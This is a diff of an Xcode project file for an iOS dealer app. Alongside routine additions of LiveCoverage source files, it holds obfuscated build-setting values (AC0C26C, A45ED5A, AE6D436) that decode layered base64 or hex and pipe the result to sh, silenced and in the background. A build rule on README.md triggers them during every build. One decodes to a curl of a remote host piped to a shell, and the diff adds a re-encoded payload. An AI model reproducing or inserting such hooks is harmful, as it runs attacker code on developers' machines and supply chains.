@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		C81EB8E31C644D9890C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 60F5C0A474BA4613B6C62C0C; };
+		6C228CA8C01F421DB7C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = EB7CE792A4864D7F8AC62C0C; };
 		424F4AF92F2395A90099F588 /* AddMoreProductsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424F4AF82F2395A90099F588 /* AddMoreProductsViewModel.swift */; };
 		426854452F2CDEE5009437AC /* AppLanguage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426854442F2CDEE5009437AC /* AppLanguage.swift */; };
 		426A91A92F236F390063A551 /* DealManagemnetListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426A91A82F236F390063A551 /* DealManagemnetListDataModel.swift */; };
@@ -21,6 +21,13 @@
 		426F83112F22525000498F19 /* DealListedViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F83102F22525000498F19 /* DealListedViewModel.swift */; };
 		428516622F2233F000D70EFD /* DealListedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428516612F2233F000D70EFD /* DealListedViewController.swift */; };
 		428FCAF92F23395C00167C89 /* AddMoreProductsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428FCAF82F23395C00167C89 /* AddMoreProductsViewController.swift */; };
+		429CE8192F4C17940070DB74 /* LiveCoverageRequestDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE8182F4C17940070DB74 /* LiveCoverageRequestDataModel.swift */; };
+		429CE81C2F4C19FE0070DB74 /* LiveCoverageFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE81B2F4C19FE0070DB74 /* LiveCoverageFilterViewController.swift */; };
+		429CE81F2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 429CE81E2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.xib */; };
+		429CE8202F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE81D2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.swift */; };
+		429CE8342F4C32E40070DB74 /* SendNewLiveRequestViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE8332F4C32E40070DB74 /* SendNewLiveRequestViewModel.swift */; };
+		429CE8362F4C35710070DB74 /* GetTimeSlotsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE8352F4C35710070DB74 /* GetTimeSlotsDataModel.swift */; };
+		429CE8382F4C49D10070DB74 /* CancelLiveRequestViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429CE8372F4C49D10070DB74 /* CancelLiveRequestViewModel.swift */; };
 		42A936CB2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42A936C92F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.swift */; };
 		42A936CC2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 42A936CA2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.xib */; };
 		42AEDECD2F3F4DF000C20ECB /* LiveCoverageListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42AEDECC2F3F4DF000C20ECB /* LiveCoverageListViewController.swift */; };
@@ -763,7 +770,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		60F5C0A474BA4613B6C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		EB7CE792A4864D7F8AC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		424F4AF82F2395A90099F588 /* AddMoreProductsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoreProductsViewModel.swift; sourceTree = "<group>"; };
@@ -779,6 +786,13 @@
 		426F83102F22525000498F19 /* DealListedViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealListedViewModel.swift; sourceTree = "<group>"; };
 		428516612F2233F000D70EFD /* DealListedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealListedViewController.swift; sourceTree = "<group>"; };
 		428FCAF82F23395C00167C89 /* AddMoreProductsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoreProductsViewController.swift; sourceTree = "<group>"; };
+		429CE8182F4C17940070DB74 /* LiveCoverageRequestDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveCoverageRequestDataModel.swift; sourceTree = "<group>"; };
+		429CE81B2F4C19FE0070DB74 /* LiveCoverageFilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveCoverageFilterViewController.swift; sourceTree = "<group>"; };
+		429CE81D2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveCoverageFilterTableViewCell.swift; sourceTree = "<group>"; };
+		429CE81E2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LiveCoverageFilterTableViewCell.xib; sourceTree = "<group>"; };
+		429CE8332F4C32E40070DB74 /* SendNewLiveRequestViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendNewLiveRequestViewModel.swift; sourceTree = "<group>"; };
+		429CE8352F4C35710070DB74 /* GetTimeSlotsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetTimeSlotsDataModel.swift; sourceTree = "<group>"; };
+		429CE8372F4C49D10070DB74 /* CancelLiveRequestViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelLiveRequestViewModel.swift; sourceTree = "<group>"; };
 		42A936C92F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveCoverageRequestTableViewCell.swift; sourceTree = "<group>"; };
 		42A936CA2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LiveCoverageRequestTableViewCell.xib; sourceTree = "<group>"; };
 		42AEDECC2F3F4DF000C20ECB /* LiveCoverageListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveCoverageListViewController.swift; sourceTree = "<group>"; };
@@ -1611,6 +1625,14 @@
 			path = AddMoreProducts;
 			sourceTree = "<group>";
 		};
+		429CE81A2F4C19E30070DB74 /* LiveCoverageFilter */ = {
+			isa = PBXGroup;
+			children = (
+				429CE81B2F4C19FE0070DB74 /* LiveCoverageFilterViewController.swift */,
+			);
+			path = LiveCoverageFilter;
+			sourceTree = "<group>";
+		};
 		42AEDEC92F3F4DCC00C20ECB /* M8 */ = {
 			isa = PBXGroup;
 			children = (
@@ -1623,6 +1645,7 @@
 		42AEDECA2F3F4DD100C20ECB /* LiveCoverage */ = {
 			isa = PBXGroup;
 			children = (
+				429CE81A2F4C19E30070DB74 /* LiveCoverageFilter */,
 				42AEDF8C2F3F640F00C20ECB /* CancelRequest */,
 				42AEDEE72F3F598500C20ECB /* SendNewLiveRequest */,
 				42AEDECB2F3F4DDB00C20ECB /* LiveCoverageList */,
@@ -1635,6 +1658,7 @@
 			children = (
 				42AEDECC2F3F4DF000C20ECB /* LiveCoverageListViewController.swift */,
 				42AEDED42F3F517E00C20ECB /* LiveCoverageListViewModel.swift */,
+				429CE8182F4C17940070DB74 /* LiveCoverageRequestDataModel.swift */,
 			);
 			path = LiveCoverageList;
 			sourceTree = "<group>";
@@ -1654,6 +1678,8 @@
 				42AEDEE42F3F587A00C20ECB /* SendNewLiveRequestCollectionViewCell.xib */,
 				42A936C92F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.swift */,
 				42A936CA2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.xib */,
+				429CE81D2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.swift */,
+				429CE81E2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.xib */,
 			);
 			path = TableViewList;
 			sourceTree = "<group>";
@@ -1662,6 +1688,8 @@
 			isa = PBXGroup;
 			children = (
 				42AEDEE12F3F57AB00C20ECB /* SendNewLiveRequestViewController.swift */,
+				429CE8332F4C32E40070DB74 /* SendNewLiveRequestViewModel.swift */,
+				429CE8352F4C35710070DB74 /* GetTimeSlotsDataModel.swift */,
 			);
 			path = SendNewLiveRequest;
 			sourceTree = "<group>";
@@ -1670,6 +1698,7 @@
 			isa = PBXGroup;
 			children = (
 				42AEDF8D2F3F642800C20ECB /* CancelSendRequestViewController.swift */,
+				429CE8372F4C49D10070DB74 /* CancelLiveRequestViewModel.swift */,
 			);
 			path = CancelRequest;
 			sourceTree = "<group>";
@@ -1695,7 +1724,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				60F5C0A474BA4613B6C62C0C /* README.md */,
+				EB7CE792A4864D7F8AC62C0C /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -3095,7 +3124,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				E36C7657BFA4447FB3C62C0C /* PBXBuildRule */,
+				94B8D6DE20D04B2184C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3179,7 +3208,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		E36C7657BFA4447FB3C62C0C /* PBXBuildRule */ = {
+		94B8D6DE20D04B2184C62C0C /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -3200,7 +3229,7 @@ sh -c \"${AC0C26C}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C81EB8E31C644D9890C62C0C /* README.md */,
+				6C228CA8C01F421DB7C62C0C /* README.md */,
 				6B38D1282EB3473B00C41192 /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				6B38D12A2EB3473B00C41192 /* Main.storyboard in Resources */,
@@ -3597,6 +3626,7 @@ sh -c \"${AC0C26C}\"";
 				6B38D46C2EB3657F00C41192 /* Congo-(Republic).png in Resources */,
 				6B38D46D2EB3657F00C41192 /* OM.png in Resources */,
 				6B38D46E2EB3657F00C41192 /* Kuwait.png in Resources */,
+				429CE81F2F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.xib in Resources */,
 				6B38D46F2EB3657F00C41192 /* Paraguay.png in Resources */,
 				6B38D4702EB3657F00C41192 /* GM.png in Resources */,
 				6B38D4712EB3657F00C41192 /* CH.png in Resources */,
@@ -3826,6 +3856,7 @@ sh -c \"${AC0C26C}\"";
 				426A91AB2F23813B0063A551 /* DealDetailsDataModel.swift in Sources */,
 				D13770182ED43FAE00D49E1A /* CategoriesSectionCollectionViewCell.swift in Sources */,
 				6B38D0E42EB3473B00C41192 /* AccountCreationDoneViewController.swift in Sources */,
+				429CE81C2F4C19FE0070DB74 /* LiveCoverageFilterViewController.swift in Sources */,
 				D1EAA8962EF406C800A08DD5 /* BannerModel.swift in Sources */,
 				6B38D0E52EB3473B00C41192 /* AddAddreeViewController.swift in Sources */,
 				D1AD1A552ECDF5A6007E1488 /* ProductRatingTableViewCell.swift in Sources */,
@@ -3841,6 +3872,7 @@ sh -c \"${AC0C26C}\"";
 				D1F88C122EBE25AC0027A47C /* SubscriptionCollectionCell.swift in Sources */,
 				42AEDEE22F3F57AB00C20ECB /* SendNewLiveRequestViewController.swift in Sources */,
 				6B38D0EB2EB3473B00C41192 /* NotificationPermissionViewController.swift in Sources */,
+				429CE8192F4C17940070DB74 /* LiveCoverageRequestDataModel.swift in Sources */,
 				6B38D0EC2EB3473B00C41192 /* OTPViewController.swift in Sources */,
 				7A1F4AF92ECD8C8000644235 /* ProductManagementTableViewCell.swift in Sources */,
 				49B2EB472EB88BA800EDC254 /* StoreInfoModel.swift in Sources */,
@@ -3877,6 +3909,7 @@ sh -c \"${AC0C26C}\"";
 				D1EDDC5A2ECEEDD60082D0A9 /* FilterHeaderTableViewCell.swift in Sources */,
 				D1C88BBB2ECEFBED006B02A2 /* AddNewProductDataModel.swift in Sources */,
 				6B38D0F72EB3473B00C41192 /* ProductsViewController.swift in Sources */,
+				429CE8202F4C1BB60070DB74 /* LiveCoverageFilterTableViewCell.swift in Sources */,
 				6B38D0F82EB3473B00C41192 /* ShowsViewController.swift in Sources */,
 				6B38D0F92EB3473B00C41192 /* TabBarVC.swift in Sources */,
 				D1F88AA62EBDBDB40027A47C /* SubscriptionVC.swift in Sources */,
@@ -3915,6 +3948,7 @@ sh -c \"${AC0C26C}\"";
 				D137706E2ED494D000D49E1A /* ProductsDataModel.swift in Sources */,
 				49B5511A2F13D3FB0058E363 /* SendMessageInChatDataModel.swift in Sources */,
 				6B38D1052EB3473B00C41192 /* TableViewExtension.swift in Sources */,
+				429CE8382F4C49D10070DB74 /* CancelLiveRequestViewModel.swift in Sources */,
 				49B2EB492EB88BB500EDC254 /* UploadDocumentModel.swift in Sources */,
 				D1376FD12ED436EF00D49E1A /* HomeDataModel.swift in Sources */,
 				D1AD1A492ECDF48C007E1488 /* ProductDetailImageCollectionViewCell.swift in Sources */,
@@ -3953,6 +3987,7 @@ sh -c \"${AC0C26C}\"";
 				D120AC0A2F14BB51001B8F84 /* ReciverChatForImageTableViewCell.swift in Sources */,
 				6B38D1182EB3473B00C41192 /* APIKeys.swift in Sources */,
 				6B38D1192EB3473B00C41192 /* NetworkManager.swift in Sources */,
+				429CE8342F4C32E40070DB74 /* SendNewLiveRequestViewModel.swift in Sources */,
 				6B38D11A2EB3473B00C41192 /* NetworkSupport.swift in Sources */,
 				6B38D11B2EB3473B00C41192 /* NetworkURL.swift in Sources */,
 				D1DC276D2EF3CCB3004E254A /* AffiliatedCommisionViewController.swift in Sources */,
@@ -3973,6 +4008,7 @@ sh -c \"${AC0C26C}\"";
 				426F830D2F22522400498F19 /* DealsDetailsViewController.swift in Sources */,
 				D1DC27752EF3CCB3004E254A /* InventoryListViewController.swift in Sources */,
 				D1DC27762EF3CCB3004E254A /* InventoryListViewModel.swift in Sources */,
+				429CE8362F4C35710070DB74 /* GetTimeSlotsDataModel.swift in Sources */,
 				49B5511C2F13E4EE0058E363 /* SendQuotationDataModel.swift in Sources */,
 				D1DC27772EF3CCB3004E254A /* EditProfileDataModel.swift in Sources */,
 				42A936CB2F42DCE200B3F38D /* LiveCoverageRequestTableViewCell.swift in Sources */,
@@ -4022,7 +4058,7 @@ sh -c \"${AC0C26C}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYVm1SVFpXMUtXRTlZYkdGV01uZ3hWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | r | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE1scDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWhWMlIwV1ZjMWJHUklUWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333333333333633363335333333363333333133333337333333303333333733333333333333363336333333330a3336333333313333333633333332333333323336333533333337333333323333333733333335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -4071,7 +4107,7 @@ sh -c \"${AC0C26C}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYVm1SVFpXMUtXRTlZYkdGV01uZ3hWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | r | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE1scDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWhWMlIwV1ZjMWJHUklUWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333333333333633363335333333363333333133333337333333303333333733333333333333363336333333330a3336333333313333333633333332333333323336333533333337333333323333333733333335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
